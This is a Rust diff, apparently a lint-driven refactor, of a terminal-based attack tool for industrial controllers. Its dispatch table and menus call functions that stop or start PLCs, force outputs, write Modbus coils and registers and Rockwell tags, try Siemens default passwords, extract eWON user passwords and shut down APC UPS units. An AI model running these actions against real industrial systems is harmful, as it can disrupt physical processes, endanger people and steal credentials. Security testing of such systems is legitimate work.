@@ -97,16 +97,6 @@ impl ExploitDef {
             risk: ExploitRisk::ReadOnly,
         }
     }
-    fn monitor(label: &'static str) -> Self {
-        Self {
-            label,
-            needs_input: false,
-            input_hint: "",
-            is_monitor: true,
-            requirement: ExploitRequirement::None,
-            risk: ExploitRisk::ReadOnly,
-        }
-    }
     fn requires(mut self, requirement: ExploitRequirement) -> Self {
         self.requirement = requirement;
         self
@@ -252,9 +242,6 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::with_input("Write Tag", "TagName=hexvalue")
                 .capability(CapabilityKey::EnipTcp)
                 .risk(ExploitRisk::WriteControl),
-            ExploitDef::monitor("Monitor Tags (poll changes)")
-                .capability(CapabilityKey::EnipTcp)
-                .risk(ExploitRisk::LongRunning),
         ],
         "mitsubishi" => vec![
             ExploitDef::new("Get Device Info (SLMP)").capability(CapabilityKey::MitsubishiIdentity),
@@ -455,7 +442,6 @@ struct SchneiderCapabilities {
     identity_confirmed: bool,
     udp_discovery_confirmed: bool,
     modbus_tcp_confirmed: bool,
-    web_candidate: bool,
     modbus_port: u16,
     web_port: Option<u16>,
     fc90_family: SchneiderFamily,
@@ -482,7 +468,6 @@ impl SchneiderCapabilities {
         let modbus_port =
             field_port_value(fields, "modbus_port").unwrap_or(crate::core::modbus::DEFAULT_PORT);
         let web_port = field_port_value(fields, "web_port");
-        let web_candidate = identity_confirmed || web_port.is_some();
         let fc90_family = SchneiderFamily::from_field(field_str(fields, "fc90_family"))
             .max_confidence(SchneiderFamily::from_name(name));
 
@@ -490,11 +475,14 @@ impl SchneiderCapabilities {
             identity_confirmed,
             udp_discovery_confirmed,
             modbus_tcp_confirmed,
-            web_candidate,
             modbus_port,
             web_port,
             fc90_family,
         }
+    }
+
+    fn web_candidate(&self) -> bool {
+        self.identity_confirmed || self.web_port.is_some()
     }
 }
 
@@ -565,7 +553,7 @@ struct App {
 }
 
 impl App {
-    fn new(db: &Database) -> Result<Self> {
+    fn new(db: &Database) -> Self {
         let (tx, rx) = mpsc::channel();
         let devices = db.load_devices().unwrap_or_default();
         let n = devices.len();
@@ -574,7 +562,7 @@ impl App {
         if n > 0 {
             list_state.select(Some(0));
         }
-        Ok(Self {
+        Self {
             devices,
             list_state,
             mode: Mode::Normal,
@@ -596,7 +584,7 @@ impl App {
             filter: String::new(),
             filtered_indices,
             active_jobs: 0,
-        })
+        }
     }
 
     fn selected_device(&self) -> Option<&DeviceRecord> {
@@ -847,7 +835,7 @@ fn capability_availability(dev: &DeviceRecord, capability: CapabilityKey) -> Act
         CapabilityKey::SchneiderModbus => {
             SchneiderCapabilities::from_device(dev).modbus_tcp_confirmed
         }
-        CapabilityKey::SchneiderWeb => SchneiderCapabilities::from_device(dev).web_candidate,
+        CapabilityKey::SchneiderWeb => SchneiderCapabilities::from_device(dev).web_candidate(),
         CapabilityKey::Fc90Classic => {
             let caps = SchneiderCapabilities::from_device(dev);
             caps.modbus_tcp_confirmed && caps.fc90_family == SchneiderFamily::ClassicFc90
@@ -939,8 +927,7 @@ fn capability_missing_reason(capability: CapabilityKey) -> &'static str {
         CapabilityKey::SlmpTcp => "SLMP TCP has not been confirmed",
         CapabilityKey::FinsTcp => "FINS TCP has not been confirmed",
         CapabilityKey::Iec104Tcp => "IEC 104 TCP has not been confirmed",
-        CapabilityKey::SnmpUdp => "SNMP UDP has not been confirmed",
-        CapabilityKey::SnmpWrite => "SNMP UDP has not been confirmed",
+        CapabilityKey::SnmpUdp | CapabilityKey::SnmpWrite => "SNMP UDP has not been confirmed",
         CapabilityKey::SnmpApc => "APC UPS not identified via SNMP sysObjectID",
     }
 }
@@ -1401,37 +1388,34 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
             }
         }
 
-        match detect_device(&target.ip, 8) {
-            Some(info) => {
+        if let Some(info) = detect_device(&target.ip, 8) {
+            let _ = tx.send(ScanEvent::Output(format!(
+                "[+] {} \u{2192} {}",
+                target.ip, info.vendor
+            )));
+            let _ = tx.send(ScanEvent::DeviceFound(info));
+            let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
+        } else {
+            if let Some(port) = target.port {
+                let mut fields = HashMap::new();
+                fields.insert("port".into(), Value::Number(i64::from(port).into()));
+                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
+                    vendor: "unknown".into(),
+                    ip: target.ip.clone(),
+                    fields,
+                }));
                 let _ = tx.send(ScanEvent::Output(format!(
-                    "[+] {} \u{2192} {}",
-                    target.ip, info.vendor
+                    "[!] {label} - no device identified; stored with custom port"
                 )));
-                let _ = tx.send(ScanEvent::DeviceFound(info));
-                let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
-            }
-            None => {
-                if let Some(port) = target.port {
-                    let mut fields = HashMap::new();
-                    fields.insert("port".into(), Value::Number(i64::from(port).into()));
-                    let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
-                        vendor: "unknown".into(),
-                        ip: target.ip.clone(),
-                        fields,
-                    }));
-                    let _ = tx.send(ScanEvent::Output(format!(
-                        "[!] {label} - no device identified; stored with custom port"
-                    )));
-                } else {
-                    let _ = tx.send(ScanEvent::Output(format!(
-                        "[-] {} \u{2014} no device identified",
-                        target.ip
-                    )));
-                }
-                let _ = tx.send(ScanEvent::Done(format!(
-                    "Scan of {label} complete (no result)"
+            } else {
+                let _ = tx.send(ScanEvent::Output(format!(
+                    "[-] {} \u{2014} no device identified",
+                    target.ip
                 )));
             }
+            let _ = tx.send(ScanEvent::Done(format!(
+                "Scan of {label} complete (no result)"
+            )));
         }
     });
 }
@@ -1620,7 +1604,7 @@ fn tag_header() -> [String; 2] {
     ]
 }
 
-/// Format one tag row — widths match tag_header().
+/// Format one tag row — widths match `tag_header()`.
 ///
 /// `base`  — base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
 /// `dims`  — dimension label ("1D" / "2D" / "3D" / "-")
@@ -1635,8 +1619,7 @@ fn fmt_tag_row(
     raw: i64,
 ) -> String {
     format!(
-        "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  0x{:04x}",
-        instance_id, name, base, dims, value, raw
+        "  {instance_id:>6}  {name:<42}  {base:<14}  {dims:<4}  {value:<18}  0x{raw:04x}"
     )
 }
 
@@ -1682,20 +1665,20 @@ fn dispatch_exploit(
         ("siemens", 0) => exploit_siemens_cpu(ip, port, input, &out),
         ("siemens", 1) => exploit_siemens_io(ip, port, input, &out),
         ("siemens", 2) => exploit_siemens_toggle(ip, port, input, &out),
-        ("schneider", 0) | ("modicon", 0) => exploit_schneider_flash(ip, &out),
-        ("schneider", 1) | ("modicon", 1) => exploit_schneider_hijack_info(ip, port, &out),
-        ("schneider", 2) | ("modicon", 2) => exploit_schneider_action(ip, port, "stop", &out),
-        ("schneider", 3) | ("modicon", 3) => exploit_schneider_action(ip, port, "run", &out),
+        ("schneider" | "modicon", 0) => exploit_schneider_flash(ip, &out),
+        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, &out),
+        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", &out),
+        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", &out),
         ("phoenix", 0) => exploit_phoenix_passwords(ip, port, &out),
         ("phoenix", 1) => exploit_phoenix_list_tags(ip, port, &out),
         ("phoenix", 2) => exploit_phoenix_read_tags(ip, port, &out),
         ("phoenix", 3) => exploit_phoenix_write_tag(ip, port, input, &out),
         ("phoenix", 4) => exploit_phoenix_info(ip, port, &out),
         ("ewon", 0) => exploit_ewon_creds(ip, port, input, &out),
-        ("rockwell", 0) | ("enip", 0) => exploit_rockwell_identity(ip, port, &out),
-        ("rockwell", 1) | ("enip", 1) => exploit_rockwell_tags(ip, port, &out),
-        ("rockwell", 2) | ("enip", 2) => exploit_rockwell_read(ip, port, input, &out),
-        ("rockwell", 3) | ("enip", 3) => exploit_rockwell_write(ip, port, input, &out),
+        ("rockwell" | "enip", 0) => exploit_rockwell_identity(ip, port, &out),
+        ("rockwell" | "enip", 1) => exploit_rockwell_tags(ip, port, &out),
+        ("rockwell" | "enip", 2) => exploit_rockwell_read(ip, port, input, &out),
+        ("rockwell" | "enip", 3) => exploit_rockwell_write(ip, port, input, &out),
         ("mitsubishi", 0) => exploit_mitsubishi_info(ip, &out),
         ("mitsubishi", 1) => exploit_slmp_map(ip, port, "quick", &out),
         ("mitsubishi", 2) => exploit_slmp_map(ip, port, "common", &out),
@@ -1706,14 +1689,14 @@ fn dispatch_exploit(
         ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, &out),
         ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, &out),
         ("siemens", 6) => exploit_siemens_read_db(ip, port, input, &out),
-        ("schneider", 4) | ("modicon", 4) => exploit_modbus_map(ip, port, "quick", &out),
-        ("schneider", 5) | ("modicon", 5) => exploit_modbus_map(ip, port, "common", &out),
-        ("schneider", 6) | ("modicon", 6) => exploit_modbus_map(ip, port, input, &out),
-        ("schneider", 7) | ("modicon", 7) => exploit_modbus_map(ip, port, "all", &out),
-        ("schneider", 8) | ("modicon", 8) => exploit_modbus_holding(ip, port, input, &out),
-        ("schneider", 9) | ("modicon", 9) => exploit_modbus_coils(ip, port, input, &out),
-        ("schneider", 10) | ("modicon", 10) => exploit_modbus_input(ip, port, input, &out),
-        ("schneider", 11) | ("modicon", 11) => exploit_modbus_discrete(ip, port, input, &out),
+        ("schneider" | "modicon", 4) => exploit_modbus_map(ip, port, "quick", &out),
+        ("schneider" | "modicon", 5) => exploit_modbus_map(ip, port, "common", &out),
+        ("schneider" | "modicon", 6) => exploit_modbus_map(ip, port, input, &out),
+        ("schneider" | "modicon", 7) => exploit_modbus_map(ip, port, "all", &out),
+        ("schneider" | "modicon", 8) => exploit_modbus_holding(ip, port, input, &out),
+        ("schneider" | "modicon", 9) => exploit_modbus_coils(ip, port, input, &out),
+        ("schneider" | "modicon", 10) => exploit_modbus_input(ip, port, input, &out),
+        ("schneider" | "modicon", 11) => exploit_modbus_discrete(ip, port, input, &out),
         ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, port, input, &out),
         ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, port, input, &out),
         ("mitsubishi", 3) => exploit_slmp_map(ip, port, input, &out),
@@ -1728,16 +1711,16 @@ fn dispatch_exploit(
         ("siemens", 7) => exploit_siemens_write_db(ip, port, input, &out),
         ("siemens", 8) => exploit_siemens_try_defaults(ip, port, &out),
         ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, port, input, &out),
-        ("schneider", 12) | ("modicon", 12) => exploit_modbus_write_coil(ip, port, input, &out),
-        ("schneider", 13) | ("modicon", 13) => exploit_modbus_write_register(ip, port, input, &out),
-        ("schneider", 14) | ("modicon", 14) => {
-            exploit_modbus_write_registers(ip, port, input, &out)
+        ("schneider" | "modicon", 12) => exploit_modbus_write_coil(ip, port, input, &out),
+        ("schneider" | "modicon", 13) => exploit_modbus_write_register(ip, port, input, &out),
+        ("schneider" | "modicon", 14) => {
+            exploit_modbus_write_registers(ip, port, input, &out);
         }
-        ("schneider", 15) | ("modicon", 15) => exploit_fc90_stop(ip, port, &out),
-        ("schneider", 16) | ("modicon", 16) => exploit_fc90_start(ip, port, &out),
-        ("schneider", 17) | ("modicon", 17) => exploit_fc90_stop_tm221(ip, port, &out),
-        ("schneider", 18) | ("modicon", 18) => exploit_fc90_start_tm221(ip, port, &out),
-        ("schneider", 19) | ("modicon", 19) => exploit_fc90_force(ip, port, input, &out),
+        ("schneider" | "modicon", 15) => exploit_fc90_stop(ip, port, &out),
+        ("schneider" | "modicon", 16) => exploit_fc90_start(ip, port, &out),
+        ("schneider" | "modicon", 17) => exploit_fc90_stop_tm221(ip, port, &out),
+        ("schneider" | "modicon", 18) => exploit_fc90_start_tm221(ip, port, &out),
+        ("schneider" | "modicon", 19) => exploit_fc90_force(ip, port, input, &out),
         ("omron", 0) => exploit_omron_info(ip, port, &out),
         ("omron", 1) => exploit_omron_read_dm(ip, port, input, &out),
         ("omron", 2) => exploit_omron_write_dm(ip, port, input, &out),
@@ -1759,7 +1742,7 @@ fn dispatch_exploit(
         ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, &out),
         _ => {
             // Auto-detect rescan: emit a DeviceFound event
-            out(&format!("[*] Auto-detecting {}...", ip));
+            out(&format!("[*] Auto-detecting {ip}..."));
             if let Some(info) = detect_device(ip, 8) {
                 out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
                 let _ = tx.send(ScanEvent::DeviceFound(info));
@@ -1940,7 +1923,7 @@ fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::flash_led;
     out(&format!("[*] Flashing LED on {ip}..."));
     match flash_led::flash_led_ip(ip) {
-        Ok(_) => out("[+] Flash LED command sent"),
+        Ok(()) => out("[+] Flash LED command sent"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -2062,21 +2045,17 @@ fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     out(&format!(
         "[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."
     ));
-    match exploit::exploit(ip, port, username, max_users) {
-        Ok(users) => {
-            for u in &users {
-                out(&format!(
-                    "  {} ({} {}): {}",
-                    u.username, u.first_name, u.last_name, u.password
-                ));
-                if !u.access_rights.is_empty() {
-                    out(&format!("    Access: {}", u.access_rights));
-                }
-            }
-            out(&format!("[+] {} user(s) extracted", users.len()));
+    let users = exploit::exploit(ip, port, username, max_users);
+    for u in &users {
+        out(&format!(
+            "  {} ({} {}): {}",
+            u.username, u.first_name, u.last_name, u.password
+        ));
+        if !u.access_rights.is_empty() {
+            out(&format!("    Access: {}", u.access_rights));
         }
-        Err(e) => out(&format!("[-] {e}")),
     }
+    out(&format!("[+] {} user(s) extracted", users.len()));
 }
 
 fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
@@ -2152,12 +2131,12 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
                 .unwrap_or_else(|| "-".to_string())
         };
         out(&fmt_tag_row(
-            t.instance_id as i64,
+            i64::from(t.instance_id),
             &t.name,
             &base,
             dims,
             &value,
-            t.tag_type as i64,
+            i64::from(t.tag_type),
         ));
     }
     out(&sep);
@@ -2176,7 +2155,7 @@ fn save_tags_and_diff(
         Ok(db) => {
             let data: Vec<(i64, &str, i64)> = tags
                 .iter()
-                .map(|t| (t.instance_id as i64, t.name.as_str(), t.tag_type as i64))
+                .map(|t| (i64::from(t.instance_id), t.name.as_str(), i64::from(t.tag_type)))
                 .collect();
             match db.upsert_tags(ip, &data) {
                 Ok(diff) if diff.is_empty() => {
@@ -2193,22 +2172,22 @@ fn save_tags_and_diff(
                         out(&format!(
                             "  [+NEW] {:<40} : {}",
                             t.name,
-                            driver::type_name(t.tag_type as u16)
+                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                         ));
                     }
                     for t in &diff.removed {
                         out(&format!(
                             "  [-DEL] {:<40} : {}",
                             t.name,
-                            driver::type_name(t.tag_type as u16)
+                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                         ));
                     }
                     for c in &diff.type_changed {
                         out(&format!(
                             "  [~CHG] {:<40} : {} \u{2192} {}",
                             c.name,
-                            driver::type_name(c.old_type as u16),
-                            driver::type_name(c.new_type as u16),
+                            driver::type_name(u16::try_from(c.old_type).unwrap_or(u16::MAX)),
+                            driver::type_name(u16::try_from(c.new_type).unwrap_or(u16::MAX)),
                         ));
                     }
                 }
@@ -2219,7 +2198,7 @@ fn save_tags_and_diff(
     }
 }
 
-fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: Arc<AtomicBool>) {
+fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc<AtomicBool>) {
     use crate::vendors::rockwell::driver;
     use chrono::Local;
 
@@ -2287,7 +2266,7 @@ fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
         0x00C4
     };
     match driver::write_tag(ip, port, tag_name, type_code, &value_bytes) {
-        Ok(_) => out(&format!("[+] {tag_name}: written")),
+        Ok(()) => out(&format!("[+] {tag_name}: written")),
         Err(e) => out(&format!("[-] {tag_name}: {e}")),
     }
 }
@@ -2320,7 +2299,6 @@ fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
         name: "auto".into(),
         ip: local_ip_for(ip),
         netmask: "255.255.255.0".into(),
-        mac: None,
     };
     out(&format!("[*] Setting Mitsubishi to {state}..."));
     match control::set_state_ip(&iface, ip, state) {
@@ -2344,7 +2322,7 @@ fn io_header() -> [String; 2] {
 
 fn fmt_io_row(addr: &str, bit: &str, val: u8) -> String {
     let value_str = if val != 0 { "true " } else { "false" };
-    format!("  {:<10}  {:<4}  {:<5}  {}", addr, bit, value_str, val)
+    format!("  {addr:<10}  {bit:<4}  {value_str:<5}  {val}")
 }
 
 fn modbus_header() -> [String; 2] {
@@ -2386,7 +2364,7 @@ fn ads_symbol_header() -> [String; 2] {
 }
 
 fn fmt_ads_symbol_row(name: &str, type_name: &str, value: &str, size: u32) -> String {
-    format!("  {:<48}  {:<14}  {:<20}  {size} B", name, type_name, value)
+    format!("  {name:<48}  {type_name:<14}  {value:<20}  {size} B")
 }
 
 // ─── DB save + diff helpers ──────────────────────────────────────────────────
@@ -2627,12 +2605,18 @@ fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
         .enumerate()
         .map(|(i, chunk)| {
             let offset = base_offset as usize + i * 16;
-            let hex: String = chunk.iter().map(|b| format!("{b:02x} ")).collect();
+            let hex: String = {
+                use std::fmt::Write;
+                chunk.iter().fold(String::new(), |mut s, b| {
+                    let _ = write!(s, "{b:02x} ");
+                    s
+                })
+            };
             let ascii: String = chunk
                 .iter()
                 .map(|&b| if b.is_ascii_graphic() { b as char } else { '.' })
                 .collect();
-            format!("  {:04x}  {:<48}  {ascii}", offset, hex)
+            format!("  {offset:04x}  {hex:<48}  {ascii}")
         })
         .collect()
 }
@@ -2847,7 +2831,7 @@ fn modbus_map_chunks(range: ModbusMapRange) -> Vec<(u16, u16)> {
     let max_count = u32::from(range.table.chunk_limit());
     while remaining > 0 {
         let count = remaining.min(max_count);
-        chunks.push((start as u16, count as u16));
+        chunks.push((u16::try_from(start).unwrap_or(u16::MAX), u16::try_from(count).unwrap_or(u16::MAX)));
         start += count;
         remaining -= count;
     }
@@ -3199,7 +3183,7 @@ fn slmp_map_chunks(range: SlmpMapRange) -> Vec<(u32, u16)> {
     let max_count = u32::from(range.chunk_limit());
     while remaining > 0 {
         let count = remaining.min(max_count);
-        chunks.push((start, count as u16));
+        chunks.push((start, u16::try_from(count).unwrap_or(u16::MAX)));
         start += count;
         remaining -= count;
     }
@@ -3530,7 +3514,6 @@ fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
         name: "auto".into(),
         ip: local_ip_for(ip),
         netmask: "255.255.255.0".into(),
-        mac: None,
     };
     out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
     match control::set_state_ip(&iface, ip, "pause") {
@@ -3545,7 +3528,7 @@ fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&st
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
-    let end = start.saturating_add(count as u32).saturating_sub(1);
+    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
     out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
     match slmp::read_word_devices(ip, port, "D", start, count) {
         Ok(vals) => {
@@ -3575,7 +3558,7 @@ fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&st
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
-    let end = start.saturating_add(count as u32).saturating_sub(1);
+    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
     out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
     match slmp::read_bit_devices(ip, port, "M", start, count) {
         Ok(vals) => {
@@ -3828,7 +3811,7 @@ fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
         .siemens
         .passwords
         .iter()
-        .map(|s| s.as_str())
+        .map(std::string::String::as_str)
         .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
         .collect();
     if !loaded.siemens.passwords.is_empty() {
@@ -3924,7 +3907,7 @@ fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
             out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
             out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
             for (i, &v) in vals.iter().enumerate() {
-                out(&format!("  DM{:<6}  {:<8}  {v:#06x}", start + i as u16, v));
+                out(&format!("  DM{:<6}  {:<8}  {v:#06x}", start + u16::try_from(i).unwrap_or(u16::MAX), v));
             }
             out(&format!("[+] {} word(s)", vals.len()));
         }
@@ -4175,10 +4158,9 @@ fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
             let dev = &app.devices[idx];
             let c = vendor_color(&dev.vendor);
             let mut name = dev.vendor.clone();
-            name.get_mut(0..1).map(|s| {
+            if let Some(s) = name.get_mut(0..1) {
                 s.make_ascii_uppercase();
-                s
-            });
+            }
             ListItem::new(vec![
                 Line::from(Span::styled(
                     format!(" {} ", dev.ip),
@@ -4216,7 +4198,7 @@ fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
 fn draw_right_panel(frame: &mut Frame, area: Rect, app: &App) {
     match app.mode {
         Mode::ExploitMenu | Mode::ExploitInput | Mode::ExploitConfirm => {
-            draw_exploit_menu(frame, area, app)
+            draw_exploit_menu(frame, area, app);
         }
         Mode::IpInput => draw_ip_input(frame, area, app),
         Mode::Search => draw_search_panel(frame, area, app),
@@ -4311,7 +4293,7 @@ fn draw_detail_panel(frame: &mut Frame, area: Rect, app: &App) {
     );
 }
 
-fn append_capability_lines<'a>(dev: &DeviceRecord, lines: &mut Vec<Line<'a>>) {
+fn append_capability_lines(dev: &DeviceRecord, lines: &mut Vec<Line<'_>>) {
     let vendor = dev.vendor.to_ascii_lowercase();
     let caps: &[(&str, CapabilityKey)] = match vendor.as_str() {
         "beckhoff" => &[
@@ -4375,10 +4357,10 @@ fn append_capability_lines<'a>(dev: &DeviceRecord, lines: &mut Vec<Line<'a>>) {
             Span::styled(
                 match caps.web_port {
                     Some(port) => format!(" :{port}"),
-                    None if caps.web_candidate => " :80".to_string(),
+                    None if caps.web_candidate() => " :80".to_string(),
                     None => " none".to_string(),
                 },
-                Style::default().fg(if caps.web_candidate {
+                Style::default().fg(if caps.web_candidate() {
                     Color::White
                 } else {
                     Color::DarkGray
@@ -4447,16 +4429,14 @@ fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &App) {
             let suffix = if availability.enabled {
                 match e.risk {
                     ExploitRisk::ReadOnly => String::new(),
-                    ExploitRisk::SensitiveRead => " [confirm]".to_string(),
-                    ExploitRisk::LongRunning => " [confirm]".to_string(),
-                    ExploitRisk::WriteControl => " [confirm]".to_string(),
+                    ExploitRisk::SensitiveRead
+                    | ExploitRisk::LongRunning
+                    | ExploitRisk::WriteControl => " [confirm]".to_string(),
                 }
             } else {
                 unavailable_suffix(availability.reason)
             };
-            let c = if !availability.enabled {
-                Color::DarkGray
-            } else if e.label.starts_with('\u{2190}') {
+            let c = if !availability.enabled || e.label.starts_with('\u{2190}') {
                 Color::DarkGray
             } else if e.risk == ExploitRisk::WriteControl {
                 Color::Red
@@ -4554,7 +4534,7 @@ fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
     );
 }
 
-fn output_widget<'a>(lines: &'a [String], height: u16, scroll: usize) -> Paragraph<'a> {
+fn output_widget(lines: &[String], height: u16, scroll: usize) -> Paragraph<'_> {
     let visible = height.saturating_sub(2) as usize;
     let total = lines.len();
 
@@ -5079,9 +5059,9 @@ fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -
 
 fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
     match code {
-        KeyCode::Esc | KeyCode::Char('o') | KeyCode::Char('O') => app.exit_zoom(),
+        KeyCode::Esc | KeyCode::Char('o' | 'O') => app.exit_zoom(),
         KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => app.exit_zoom(),
-        KeyCode::Char('c') | KeyCode::Char('C') => {
+        KeyCode::Char('c' | 'C') => {
             app.output_lines.clear();
             app.output_scroll = 0;
         }
@@ -5090,21 +5070,17 @@ fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
         KeyCode::PageDown => app.scroll_output_down(20),
         KeyCode::PageUp => app.scroll_output_up(20),
         // g = go to top (oldest), G = go to bottom (newest / auto-scroll)
-        KeyCode::Char('G') => app.output_scroll = 0,
-        KeyCode::Char('g') => {
+        KeyCode::Char('G') | KeyCode::End => app.output_scroll = 0,
+        KeyCode::Char('g') | KeyCode::Home => {
             app.output_scroll = app.output_lines.len().saturating_sub(1);
         }
-        KeyCode::Home => {
-            app.output_scroll = app.output_lines.len().saturating_sub(1);
-        }
-        KeyCode::End => app.output_scroll = 0,
         _ => {}
     }
 }
 
 fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
     match code {
-        KeyCode::Char('q') | KeyCode::Char('Q') => {
+        KeyCode::Char('q' | 'Q') => {
             if app.quit_confirm {
                 return true;
             }
@@ -5121,24 +5097,24 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
         KeyCode::PageDown => {
             app.scroll_output_down(10);
         }
-        KeyCode::Char('o') | KeyCode::Char('O') => app.enter_zoom(),
+        KeyCode::Char('o' | 'O') => app.enter_zoom(),
         KeyCode::Char('j') | KeyCode::Down => app.select_next(),
         KeyCode::Char('k') | KeyCode::Up => app.select_prev(),
-        KeyCode::Char('a') | KeyCode::Char('A') => {
+        KeyCode::Char('a' | 'A') => {
             app.input_buf.clear();
             app.output_lines.clear();
             app.output_scroll = 0;
             app.mode = Mode::IpInput;
         }
-        KeyCode::Char('s') | KeyCode::Char('S') => {
+        KeyCode::Char('s' | 'S') => {
             app.scan_menu_sel = 0;
             app.mode = Mode::ScanMenu;
         }
-        KeyCode::Char('e') | KeyCode::Char('E') => {
+        KeyCode::Char('e' | 'E') => {
             app.open_exploit_menu();
             maybe_auto_load_tags(app);
         }
-        KeyCode::Char('r') | KeyCode::Char('R') => {
+        KeyCode::Char('r' | 'R') => {
             if let Some(ip) = app.selected_device_ip() {
                 if app.active_jobs == 0 {
                     app.output_lines.clear();
@@ -5158,11 +5134,11 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
                 spawn_ip_scan(target, tx);
             }
         }
-        KeyCode::Char('c') | KeyCode::Char('C') if !mods.contains(KeyModifiers::CONTROL) => {
+        KeyCode::Char('c' | 'C') if !mods.contains(KeyModifiers::CONTROL) => {
             app.output_lines.clear();
             app.output_scroll = 0;
         }
-        KeyCode::Char('d') | KeyCode::Char('D') => {
+        KeyCode::Char('d' | 'D') => {
             if let Some(dev) = app.selected_device() {
                 let (id, ip) = (dev.id, dev.ip.clone());
                 if db.delete_device(id).is_ok() {
@@ -5262,8 +5238,8 @@ fn handle_exploit_menu(app: &mut App, code: KeyCode) {
         KeyCode::PageDown => {
             app.scroll_output_down(10);
         }
-        KeyCode::Char('o') | KeyCode::Char('O') => app.enter_zoom(),
-        KeyCode::Char('v') | KeyCode::Char('V') => {
+        KeyCode::Char('o' | 'O') => app.enter_zoom(),
+        KeyCode::Char('v' | 'V') => {
             let active = app.selected_vendor().unwrap_or_default();
             app.vendor_pick_sel = ALL_VENDORS
                 .iter()
@@ -5281,7 +5257,7 @@ fn handle_exploit_menu(app: &mut App, code: KeyCode) {
             let is_back = app
                 .exploit_defs
                 .get(app.exploit_sel)
-                .map_or(false, |e| e.label.starts_with('\u{2190}'));
+                .is_some_and(|e| e.label.starts_with('\u{2190}'));
             if is_back {
                 app.mode = Mode::Normal;
             } else {
@@ -5346,7 +5322,7 @@ fn handle_exploit_confirm(app: &mut App, code: KeyCode) {
         KeyCode::Enter => {
             if app.input_buf.trim() == "YES" {
                 if let Some(pending) = app.pending_exploit.take() {
-                    execute_pending_exploit(app, pending);
+                    execute_pending_exploit(app, &pending);
                 }
                 app.mode = Mode::ExploitMenu;
             } else {
@@ -5445,14 +5421,9 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
     use crate::db::Database;
     use crate::vendors::rockwell::driver;
 
-    let db = match Database::open(&Database::default_path()) {
-        Ok(d) => d,
-        Err(_) => return false,
-    };
-    let tags = match db.load_tags(ip) {
-        Ok(t) if !t.is_empty() => t,
-        _ => return false,
-    };
+    let Ok(db) = Database::open(&Database::default_path()) else { return false };
+    let Ok(tags) = db.load_tags(ip) else { return false };
+    if tags.is_empty() { return false; }
 
     lines.push(format!(
         "══ {} saved tags @ {ip} (DB snapshot) ══",
@@ -5462,7 +5433,7 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
     lines.push(hdr);
     lines.push(sep.clone());
     for t in &tags {
-        let (base, dims) = driver::type_parts(t.tag_type as u16);
+        let (base, dims) = driver::type_parts(u16::try_from(t.tag_type).unwrap_or(u16::MAX));
